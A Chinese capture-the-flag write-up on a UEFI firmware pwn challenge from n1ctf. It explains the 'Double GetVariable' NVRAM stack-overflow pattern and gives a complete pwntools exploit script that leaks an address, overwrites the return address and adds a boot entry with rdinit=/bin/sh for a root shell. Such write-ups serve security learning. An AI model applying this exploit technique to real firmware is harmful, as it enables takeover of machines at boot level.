**作者：Rivaille@知道创宇404实验室  
日期：2022年11月10日**

周末的时候打了`n1ctf`，遇到一道`uefi`相关的题目，我比较感兴趣，之前就想学习一下安全启动相关的东西，这次正好趁着这个机会入门一下。

周天做的时候，一直卡在一个点上，没有多去找找资料属实败笔。

## 题目分析

先解包`OVMF.fd`文件，用`uefi-firmware-parse`这个工具：

    
    
    uefi-firmware-parser -ecO ./OVMF.fd

简单看一下解包后的目录，大致判断`BIOS`可能在`file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792`或者`file-df1ccef6-f301-4a63-9661-fc6030dcc880`这个目录中。

![](https://images.seebug.org/content/images/2022/11/c8f4b10d-eef7-4069-9052-bf27ab4463d3.png-w331s)

通过对`UiApp`字符串的查找，基本判断`UiApp`是在`volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0`目录下。

![](https://images.seebug.org/content/images/2022/11/f3b0a301-f0b6-4e51-b592-aacbac02b5fc.png-w331s)

连按`f12`进入`BIOS`之后，可以看到`UiApp`一闪而过，然后看到了熟悉的菜单，找找关键的字符串，就确定了对应的二进制文件。

![](https://images.seebug.org/content/images/2022/11/92a4189c-254c-4eed-9600-9833722314d7.png-w331s)

现在需要修改一下启动脚本，让脚本启动`OVMF.fd`之后挂住，然后`gdb attach`进行调试。

    
    
    import os, subprocess
    import random
    
    def main():
        try:
            os.system("rm -f OVMF.fd")
            os.system("cp OVMF.fd.bak OVMF.fd")
            ret = subprocess.call([
                "qemu-system-x86_64",
                "-m", str(256+random.randint(0, 512)),
                "-drive", "if=pflash,format=raw,file=OVMF.fd",
                "-drive", "file=fat:rw:contents,format=raw",
                "-net", "none",
                "-monitor", "/dev/null",
                "-s","-S",
                "-nographic"
            ])
            print("Return:", ret)
        except Exception as e:
            print(e)
            print("Error!")
        finally:
            print("Done.")
    
    if __name__ == "__main__":
        main()

了解过操作系统的朋友们应该知道，操作系统的加载过程分为三步：`BIOS`固件（或者说是`UEFI`）的内存地址是写死的，通过`BIOS`加载`bootloader`，再通过`bootloader`去完成对操作系统镜像的加载。`gdb
attach`之后，我们看到程序断在了`0xfff0`地址处，这个应该就是`BIOS`的基址了。

![](https://images.seebug.org/content/images/2022/11/b3e5aee9-eff0-4271-8295-04330f5197e2.png-w331s)

## 漏洞分析

进入`UiApp`之后没有直接到`Boot
Manager`界面，而是到了菜单界面，猜测一下这是需要解题者`hacker`掉这个菜单，劫持控制流到`BIOS`中可以获取高权限`shell`的地方。通过查找关键字，锁定了目标程序：`file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792\section0\section3\volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf\file-462caa21-7614-4503-836e-8ab6f4662331\section0.pe`。

通过`winchecksec`查看开启的保护机制：

![](https://images.seebug.org/content/images/2022/11/bbbb2327-0f96-4996-bd37-0e70a4a4f017.png-w331s)

然后通过关键字很快就定位到了出题人加的菜单函数中，但是很烦的事情是，我发现`ida`不能正确识别函数参数：

![](https://images.seebug.org/content/images/2022/11/05128238-801f-4597-a973-34cc08dd4ad7.png-w331s)

反汇编之后的结果成了这个鸟样：

![](https://images.seebug.org/content/images/2022/11/5b0df771-6776-453d-8cd0-96a1ed7138e8.png-w331s)

![](https://images.seebug.org/content/images/2022/11/eab77bbe-e3a7-49c1-b8e5-fcef28653fbe.png-w331s)

![](https://images.seebug.org/content/images/2022/11/934b9353-2ffc-41ce-95d7-1f31d2e38a9c.png-w331s)

![](https://images.seebug.org/content/images/2022/11/2e4a1d39-117b-4a32-b3ec-606945ef6be5.png-w331s)

通过查找资料以及逆向分析，还原出了`gRT`这个结构体，其中有两个比较重要的成员函数：`gRT->SetVariable`将栈中的值写入键值对，`gRT->GetVariable`将键值对中的值拷贝到栈中。经过分析，大概判断是要通过`gRT->GetVariable`来实现栈溢出，完成对控制流的劫持。

但是溢出点在哪里呢？当时在比赛过程中一直卡在这儿，最失误的一点就是没有多`google`一下，一直在蒙头做题。在赛后和`Mr.R`师傅交流的过程中，得知这道题考察的是`UEFI`中一种常见的漏洞模式：`Double
GetVariable`。

漏洞原理是这样的：`GetVariable`在第一次从`nvram`取值写入栈中时，如果`nvram`变量的长度不为`1`，`datasize`的长度会被改写为对应`nvram`变量的长度。第二次调用`GetVariable`函数时，如果对`datasize`未做初始化，就有可能造成溢出。

相关漏洞可以参考一下这篇文章：<https://binarly.io/advisories/BRLY-2021-007/index.html>。（比赛时候还是得多`google`一下）。

回到`Encode`函数，我们看到函数从`N1CTF_KEY`中取值写入栈，然后和`buffer`中的值进行异或运算。而`Add`函数可以重新写入`nvram`变量，且写入的字符串最大长度为`256`字节，就是说我们可以通过`Add`覆盖掉之前定义的`N1CTF_KEY1`，`N1CTF_KEY2`，`N1CTF_KEY3`这三个变量的值。我们覆写`N1CTF_KEY1`的值为`a*0x1c`，覆写`N1CTF_KEY2`的值为`a*0x18+p32(boot_addr)`，然后设置一个`nvram`变量`OVERFLOW`，使其长度为`0x11`个字节，然后进入`Encode`函数，对`OVERFLOW`的值进行编码，这样第一次读取`N1CTF_KEY1`改写`datasize`，第二次读取`N1CTF_KEY2`就可以溢出到函数的返回地址处，劫持`rip`寄存器，使其跳转到`boot
manager`的设置界面，获取`root shell`。
![](https://images.seebug.org/content/images/2022/11/c7f52920-859d-4d3d-882b-67fc216c7f09.png-w331s)

这里的`pwn`函数就是出题人加的存在漏洞的函数，我们可以把控制流劫持到后面的`else`的基本块中去，然后应该可以正常进入`Boot
Manager`的界面。

## 动态调试

首先要确定`UiApp`加载的基址，一个很好的办法是对内存中特定的指令序列进行搜索，比如说我们在`ida`里面找到这条指令。

![](https://images.seebug.org/content/images/2022/11/96131b79-bc7d-4b87-ba2f-ec413690ffaa.png-w331s)

![](https://images.seebug.org/content/images/2022/11/0bebcaca-8344-4093-905e-8a162be0cb81.png-w331s)

![](https://images.seebug.org/content/images/2022/11/8b116329-48e7-4e12-8672-c4095f92ac47.png-w331s)

第二个地址减去偏移就是程序的基址。

调试的过程中会发现一个问题：虽然`winchecksec`检查程序没有开启`aslr`，但是实际上`UiApp`的加载基址是在变化的。所以需要泄露`.text`段的一个内存地址，才能成功把返回地址覆写成`boot
manager`对应的地址。

在调试的过程中，我发现当`Add`设置的字符串长度等于`256`个字节时，会打印出一个地址。通过多次尝试，我发现这个地址和`UiApp`的基址的偏移一定程度上是固定，为`0x1d009c0`或者`0x1e009c0`，通过泄露出的地址减去偏移实际上也就得到了`UiApp`的基址。

![](https://images.seebug.org/content/images/2022/11/22b96704-527d-4dc0-9c36-a704ac1a5e51.png-w331s)

## 漏洞利用

和图形化界面进行交互，`pwntools`确实还存在一些问题，所以可以通过`socat`来进行连接。最终`exp`如下：

    
    
    from pwn import *
    
    context.log_level = "debug"
    context.arch = "amd64"
    
    boot_offset = 0x235A
    uiapp_offset = 0x1e009c0
    
    DEBUG = 1
    if DEBUG == 1:
        '''
        fname = "/tmp/uefi"
        os.system("cp OVMF.fd %s"%fname)
        os.system("chmod u+w %s"%fname)
        '''
        p = process([
                "qemu-system-x86_64",
                "-m", str(256+random.randint(0, 512)),
                "-drive", "if=pflash,format=raw,file=OVMF.fd",
                "-drive", "file=fat:rw:contents,format=raw",
                "-net", "none",
                "-monitor", "/dev/null",
                #"-s","-S",
                "-nographic"
            ])
    else :
        p = remote("47.243.105.43","9999")
    
    LOCAL_REMOTE = 0
    if LOCAL_REMOTE:
        os.system("socat $(tty),echo=0,escape=0x03 SYSTEM:\"python ./exp.py \" 2>&1")
    
    key_map = {
        "up":    b"\x1b[A",
        "down":  b"\x1b[B",
        "left":  b"\x1b[D",
        "right": b"\x1b[C",
        "esc":   b"\x1b^[",
        "enter": b"\r",
        "tab":   b"\t"
    }
    
    def send_key(key,times = 1):
        for _ in range(times):
            p.send(key_map[key])
            if key == "enter":
                p.recv()
    
    def add(Keyname,Keyvalue):
        p.sendlineafter("> \n",str(1))
        p.sendlineafter('Key name:\n',Keyname)
        p.sendlineafter('Key value:\n',Keyvalue)
    
    def delete(Keyname,Keyvalue):
        p.sendlineafter("> \n",str(2))
        p.sendlineafter('Key name:\n',Keyname)
    
    def Encode(Keyname):
        p.sendlineafter("> \n",str(4))
        p.sendlineafter("Key name:\n",Keyname)
        p.recv()
    
    def exp():
        # leak UiAPP address
        p.sendline("\x1b[24~"*10)
        p.sendlineafter("> \n",str(1))
        p.sendlineafter("Key name:\n","N1CTF_KEY3")
        p.sendafter("Key value:\n",'a'*256)
        p.recvuntil('Encode\n> \n')
    
        p.sendline(str(3))
        p.recvuntil("Key name:\n")
        p.sendline('N1CTF_KEY3')
        p.recvuntil('Value: \n')
        p.recvuntil('a'*256)
        data = p.recvuntil('\n').strip('\n')
        leak_addr,i,j = 0,0,0
        while i < len(data):
            print(data[i])
            if data[i] == "\\":
                n = int(data[i+2],16)*0x10 + int(data[i+3],16)
                i += 4
            else:
                n = ord(data[i])
                i += 1
            leak_addr += n * (0x100**j)
            j += 1
    
        uiapp_base_addr = leak_addr - uiapp_offset
        log.success("leak address: %s"%hex(leak_addr))
        log.success("UiApp address: %s"%hex(uiapp_base_addr))
        boot_addr = uiapp_base_addr + boot_offset
        pause()
    
        # statck overflow
        payload = 'a'*0x18 + p32(boot_addr)
        add("N1CTF_KEY1",payload)
        add("N1CTF_KEY2",payload)
        add("OVERFLOW",'a'*0x11)
    
        p.recvuntil("> \n")
        p.sendline('4')
        p.recvuntil('Key name:\n')
        p.sendline('OVERFLOW')
        # Add option,get root shell
        p.recvuntil(b"Standard PC")
        send_key("down", 3)
        send_key("enter")
        send_key("enter")
        send_key("down")
        send_key("enter")
        send_key("enter")
        send_key("down", 3)
        send_key("enter")
        p.send(b"\rrootshell\r")
        send_key("down")
        p.send(b"\rconsole=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet\r")
        send_key("down")
        send_key("enter")
        send_key("up")
        send_key("enter")
        send_key("esc")
        send_key("enter")
        send_key("down", 3)
        send_key("enter")
    
        # root shell
        # p.sendlineafter(b"/ #", b"cat /flag")
        p.interactive()
    
    def main():
        exp()
    
    if __name__ == "__main__":
        main()

![](https://images.seebug.org/content/images/2022/11/191f6bce-688c-4cbf-bb56-78371cf25d16.png-w331s)

## 参考资料

<https://www.anquanke.com/post/id/243007#h2-0>

<https://eqqie.cn/index.php/archives/1929>

<https://github.com/topics/uefi-pwn>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/2010/>

